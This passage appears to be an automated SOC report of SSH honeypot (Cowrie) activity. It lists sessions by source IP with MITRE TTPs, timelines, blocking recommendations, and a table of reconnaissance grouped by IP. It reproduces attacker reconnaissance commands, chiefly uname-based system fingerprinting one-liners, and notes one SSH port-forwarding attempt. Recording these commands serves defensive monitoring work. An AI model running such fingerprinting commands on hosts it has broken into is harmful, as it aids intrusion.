| `2026-09-04 12:39:27` | `cowrie.command.input` |
| `2026-09-04 12:39:27` | `cowrie.command.input` |
| `2026-09-04 12:39:27` | `cowrie.command.input` |
| `2026-09-04 12:39:28` | `cowrie.log.closed` |
| `2026-09-04 12:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de15a716db29

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:40 |
| **Last Seen** | 2026-09-04 12:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:40:16` | `cowrie.session.connect` |
| `2026-09-04 12:40:16` | `cowrie.client.version` |
| `2026-09-04 12:40:16` | `cowrie.client.kex` |
| `2026-09-04 12:40:16` | `cowrie.login.success` |
| `2026-09-04 12:40:17` | `cowrie.session.params` |
| `2026-09-04 12:40:17` | `cowrie.command.input` |
| `2026-09-04 12:40:17` | `cowrie.log.closed` |
| `2026-09-04 12:40:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab8bfd42df3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-04 12:41 |
| **Last Seen** | 2026-09-04 12:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:41:37` | `cowrie.session.connect` |
| `2026-09-04 12:41:37` | `cowrie.client.version` |
| `2026-09-04 12:41:37` | `cowrie.client.kex` |
| `2026-09-04 12:41:40` | `cowrie.login.success` |
| `2026-09-04 12:41:42` | `cowrie.session.params` |
| `2026-09-04 12:41:42` | `cowrie.command.input` |
| `2026-09-04 12:41:42` | `cowrie.command.input` |
| `2026-09-04 12:41:42` | `cowrie.command.input` |
| `2026-09-04 12:41:42` | `cowrie.command.input` |
| `2026-09-04 12:41:42` | `cowrie.command.input` |
| `2026-09-04 12:41:42` | `cowrie.command.success` |
| `2026-09-04 12:41:42` | `cowrie.command.input` |
| `2026-09-04 12:41:42` | `cowrie.command.input` |
| `2026-09-04 12:41:42` | `cowrie.command.input` |
| `2026-09-04 12:41:42` | `cowrie.command.input` |
| `2026-09-04 12:41:42` | `cowrie.log.closed` |
| `2026-09-04 12:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-777bbc09efa8

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:41 |
| **Last Seen** | 2026-09-04 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:41:50` | `cowrie.session.connect` |
| `2026-09-04 12:41:50` | `cowrie.client.version` |
| `2026-09-04 12:41:50` | `cowrie.client.kex` |
| `2026-09-04 12:41:50` | `cowrie.login.success` |
| `2026-09-04 12:41:51` | `cowrie.session.params` |
| `2026-09-04 12:41:51` | `cowrie.command.input` |
| `2026-09-04 12:41:51` | `cowrie.log.closed` |
| `2026-09-04 12:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67a1d035a2dc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:43 |
| **Last Seen** | 2026-09-04 12:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:43:30` | `cowrie.session.connect` |
| `2026-09-04 12:43:30` | `cowrie.client.version` |
| `2026-09-04 12:43:30` | `cowrie.client.kex` |
| `2026-09-04 12:43:30` | `cowrie.login.success` |
| `2026-09-04 12:43:31` | `cowrie.session.params` |
| `2026-09-04 12:43:31` | `cowrie.command.input` |
| `2026-09-04 12:43:31` | `cowrie.log.closed` |
| `2026-09-04 12:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d524a0cf2ef3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-04 12:43 |
| **Last Seen** | 2026-09-04 12:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:43:50` | `cowrie.session.connect` |
| `2026-09-04 12:43:51` | `cowrie.client.version` |
| `2026-09-04 12:43:51` | `cowrie.client.kex` |
| `2026-09-04 12:43:53` | `cowrie.login.success` |
| `2026-09-04 12:43:54` | `cowrie.session.params` |
| `2026-09-04 12:43:54` | `cowrie.command.input` |
| `2026-09-04 12:43:54` | `cowrie.command.input` |
| `2026-09-04 12:43:54` | `cowrie.command.input` |
| `2026-09-04 12:43:54` | `cowrie.command.input` |
| `2026-09-04 12:43:54` | `cowrie.command.input` |
| `2026-09-04 12:43:54` | `cowrie.command.success` |
| `2026-09-04 12:43:54` | `cowrie.command.input` |
| `2026-09-04 12:43:54` | `cowrie.command.input` |
| `2026-09-04 12:43:54` | `cowrie.command.input` |
| `2026-09-04 12:43:54` | `cowrie.command.input` |
| `2026-09-04 12:43:55` | `cowrie.log.closed` |
| `2026-09-04 12:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8084aaddb259

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:45 |
| **Last Seen** | 2026-09-04 12:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:45:13` | `cowrie.session.connect` |
| `2026-09-04 12:45:13` | `cowrie.client.version` |
| `2026-09-04 12:45:13` | `cowrie.client.kex` |
| `2026-09-04 12:45:13` | `cowrie.login.success` |
| `2026-09-04 12:45:14` | `cowrie.session.params` |
| `2026-09-04 12:45:14` | `cowrie.command.input` |
| `2026-09-04 12:45:14` | `cowrie.log.closed` |
| `2026-09-04 12:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f2851b10f25

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-04 12:46 |
| **Last Seen** | 2026-09-04 12:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:46:00` | `cowrie.session.connect` |
| `2026-09-04 12:46:01` | `cowrie.client.version` |
| `2026-09-04 12:46:01` | `cowrie.client.kex` |
| `2026-09-04 12:46:03` | `cowrie.login.success` |
| `2026-09-04 12:46:05` | `cowrie.session.params` |
| `2026-09-04 12:46:05` | `cowrie.command.input` |
| `2026-09-04 12:46:05` | `cowrie.command.input` |
| `2026-09-04 12:46:05` | `cowrie.command.input` |
| `2026-09-04 12:46:05` | `cowrie.command.input` |
| `2026-09-04 12:46:05` | `cowrie.command.input` |
| `2026-09-04 12:46:05` | `cowrie.command.success` |
| `2026-09-04 12:46:05` | `cowrie.command.input` |
| `2026-09-04 12:46:05` | `cowrie.command.input` |
| `2026-09-04 12:46:05` | `cowrie.command.input` |
| `2026-09-04 12:46:05` | `cowrie.command.input` |
| `2026-09-04 12:46:06` | `cowrie.log.closed` |
| `2026-09-04 12:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a920ead9177a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:46 |
| **Last Seen** | 2026-09-04 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:46:55` | `cowrie.session.connect` |
| `2026-09-04 12:46:55` | `cowrie.client.version` |
| `2026-09-04 12:46:55` | `cowrie.client.kex` |
| `2026-09-04 12:46:55` | `cowrie.login.success` |
| `2026-09-04 12:46:56` | `cowrie.session.params` |
| `2026-09-04 12:46:56` | `cowrie.command.input` |
| `2026-09-04 12:46:56` | `cowrie.log.closed` |
| `2026-09-04 12:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cde1b1310e6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 12:47 |
| **Last Seen** | 2026-09-04 12:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:47:22` | `cowrie.session.connect` |
| `2026-09-04 12:47:22` | `cowrie.client.version` |
| `2026-09-04 12:47:22` | `cowrie.client.kex` |
| `2026-09-04 12:47:23` | `cowrie.login.success` |
| `2026-09-04 12:47:23` | `cowrie.direct-tcpip.request` |
| `2026-09-04 12:47:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 12:47:24` | `cowrie.direct-tcpip.data` |
| `2026-09-04 12:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90aa25df008f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:48 |
| **Last Seen** | 2026-09-04 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:48:37` | `cowrie.session.connect` |
| `2026-09-04 12:48:37` | `cowrie.client.version` |
| `2026-09-04 12:48:37` | `cowrie.client.kex` |
| `2026-09-04 12:48:37` | `cowrie.login.success` |
| `2026-09-04 12:48:38` | `cowrie.session.params` |
| `2026-09-04 12:48:38` | `cowrie.command.input` |
| `2026-09-04 12:48:38` | `cowrie.log.closed` |
| `2026-09-04 12:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e031fb1548

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:50 |
| **Last Seen** | 2026-09-04 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:50:21` | `cowrie.session.connect` |
| `2026-09-04 12:50:21` | `cowrie.client.version` |
| `2026-09-04 12:50:21` | `cowrie.client.kex` |
| `2026-09-04 12:50:21` | `cowrie.login.success` |
| `2026-09-04 12:50:22` | `cowrie.session.params` |
| `2026-09-04 12:50:22` | `cowrie.command.input` |
| `2026-09-04 12:50:22` | `cowrie.log.closed` |
| `2026-09-04 12:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2a054ec81f8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-04 12:50 |
| **Last Seen** | 2026-09-04 12:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:50:30` | `cowrie.session.connect` |
| `2026-09-04 12:50:30` | `cowrie.client.version` |
| `2026-09-04 12:50:30` | `cowrie.client.kex` |
| `2026-09-04 12:50:32` | `cowrie.login.success` |
| `2026-09-04 12:50:33` | `cowrie.session.params` |
| `2026-09-04 12:50:33` | `cowrie.command.input` |
| `2026-09-04 12:50:33` | `cowrie.command.input` |
| `2026-09-04 12:50:33` | `cowrie.command.input` |
| `2026-09-04 12:50:33` | `cowrie.command.input` |
| `2026-09-04 12:50:33` | `cowrie.command.input` |
| `2026-09-04 12:50:33` | `cowrie.command.success` |
| `2026-09-04 12:50:33` | `cowrie.command.input` |
| `2026-09-04 12:50:33` | `cowrie.command.input` |
| `2026-09-04 12:50:33` | `cowrie.command.input` |
| `2026-09-04 12:50:33` | `cowrie.command.input` |
| `2026-09-04 12:50:34` | `cowrie.log.closed` |
| `2026-09-04 12:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-025b93618523

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:52 |
| **Last Seen** | 2026-09-04 12:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:52:01` | `cowrie.session.connect` |
| `2026-09-04 12:52:01` | `cowrie.client.version` |
| `2026-09-04 12:52:01` | `cowrie.client.kex` |
| `2026-09-04 12:52:01` | `cowrie.login.success` |
| `2026-09-04 12:52:02` | `cowrie.session.params` |
| `2026-09-04 12:52:02` | `cowrie.command.input` |
| `2026-09-04 12:52:02` | `cowrie.log.closed` |
| `2026-09-04 12:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185289cc7f94

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-04 12:52 |
| **Last Seen** | 2026-09-04 12:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:52:48` | `cowrie.session.connect` |
| `2026-09-04 12:52:49` | `cowrie.client.version` |
| `2026-09-04 12:52:49` | `cowrie.client.kex` |
| `2026-09-04 12:52:50` | `cowrie.login.success` |
| `2026-09-04 12:52:51` | `cowrie.session.params` |
| `2026-09-04 12:52:51` | `cowrie.command.input` |
| `2026-09-04 12:52:51` | `cowrie.command.input` |
| `2026-09-04 12:52:51` | `cowrie.command.input` |
| `2026-09-04 12:52:51` | `cowrie.command.input` |
| `2026-09-04 12:52:51` | `cowrie.command.input` |
| `2026-09-04 12:52:51` | `cowrie.command.success` |
| `2026-09-04 12:52:51` | `cowrie.command.input` |
| `2026-09-04 12:52:51` | `cowrie.command.input` |
| `2026-09-04 12:52:51` | `cowrie.command.input` |
| `2026-09-04 12:52:51` | `cowrie.command.input` |
| `2026-09-04 12:52:52` | `cowrie.log.closed` |
| `2026-09-04 12:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bffc4d14bcb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:53 |
| **Last Seen** | 2026-09-04 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:53:37` | `cowrie.session.connect` |
| `2026-09-04 12:53:37` | `cowrie.client.version` |
| `2026-09-04 12:53:37` | `cowrie.client.kex` |
| `2026-09-04 12:53:38` | `cowrie.login.success` |
| `2026-09-04 12:53:39` | `cowrie.session.params` |
| `2026-09-04 12:53:39` | `cowrie.command.input` |
| `2026-09-04 12:53:39` | `cowrie.log.closed` |
| `2026-09-04 12:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🟡 MEDIUM · IR-6cb2a9a67e11

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 06:55 |
| **Last Seen** | 2026-09-04 06:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1083 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:55:05` | `cowrie.session.params` |
| `2026-09-04 06:55:05` | `cowrie.command.input` |
| `2026-09-04 06:55:05` | `cowrie.command.input` |
| `2026-09-04 06:55:05` | `cowrie.command.input` |
| `2026-09-04 06:55:05` | `cowrie.command.input` |
| `2026-09-04 06:55:05` | `cowrie.command.input` |
| `2026-09-04 06:55:05` | `cowrie.command.success` |
| `2026-09-04 06:55:05` | `cowrie.command.input` |
| `2026-09-04 06:55:05` | `cowrie.command.input` |
| `2026-09-04 06:55:05` | `cowrie.command.input` |
| `2026-09-04 06:55:05` | `cowrie.command.input` |
| `2026-09-04 06:55:06` | `cowrie.log.closed` |
| `2026-09-04 06:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Monitor for repeat activity from `195.178.110[.]232`
- [ ] No immediate escalation required

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `51.158.205[.]203` | **6** | 2026-09-04 12:41 | 2026-09-04 12:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | **5** | 2026-09-04 06:57 | 2026-09-04 08:20 | 3m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.160.67[.]73` | **4** | 2026-09-04 08:13 | 2026-09-04 08:14 | 2m | 0 | `T1592` | 🟢 LOW |
| `45.181.133[.]214` | **4** | 2026-09-04 12:37 | 2026-09-04 12:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]202` | **3** | 2026-09-04 08:35 | 2026-09-04 08:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | **3** | 2026-09-04 09:37 | 2026-09-04 09:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `179.2.125[.]34` | **3** | 2026-09-04 07:32 | 2026-09-04 07:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | **3** | 2026-09-04 11:01 | 2026-09-04 12:46 | 3m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]95` | **3** | 2026-09-04 11:45 | 2026-09-04 11:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]133` | **3** | 2026-09-04 11:51 | 2026-09-04 11:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]62` | **3** | 2026-09-04 11:47 | 2026-09-04 11:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]82` | **3** | 2026-09-04 11:52 | 2026-09-04 11:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | **3** | 2026-09-04 11:03 | 2026-09-04 11:28 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `160.3.5[.]133` | **2** | 2026-09-04 09:44 | 2026-09-04 09:46 | 2m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]86` | **2** | 2026-09-04 07:08 | 2026-09-04 07:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.76.61[.]232` | **2** | 2026-09-04 08:25 | 2026-09-04 08:29 | 4m | 0 | `T1592` | 🟢 LOW |
| `181.46.9[.]110` | **2** | 2026-09-04 07:16 | 2026-09-04 07:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.99.5[.]222` | **2** | 2026-09-04 11:02 | 2026-09-04 11:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.165.46[.]47` | **2** | 2026-09-04 11:35 | 2026-09-04 11:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.74.51[.]79` | **2** | 2026-09-04 08:06 | 2026-09-04 08:06 | 0m | 0 | `T1592` | 🟢 LOW |
